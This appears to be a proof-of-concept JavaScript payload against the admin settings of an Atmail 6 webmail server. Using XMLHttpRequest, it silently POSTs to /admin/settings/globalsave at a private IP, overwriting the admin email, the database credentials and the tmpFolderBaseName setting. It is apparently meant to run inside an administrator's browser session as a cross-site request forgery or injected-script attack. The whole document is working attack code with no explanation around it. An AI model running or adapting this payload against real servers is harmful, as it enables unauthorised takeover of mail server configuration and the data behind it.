var a=new XMLHttpRequest();
var url="http://192.168.11.236/index.php/admin/settings/globalsave";
alert('trigger');
a.open("POST",url,true);
a.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
data="save=1&fields%5Badmin_email%5D=postmaster%40mydomain.com&fields%5Bsession_timeout%5D=120&fields%5Bsql_host%5D=127.0.0.1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&fields[tmpFolderBaseName]=";
a.send(data);
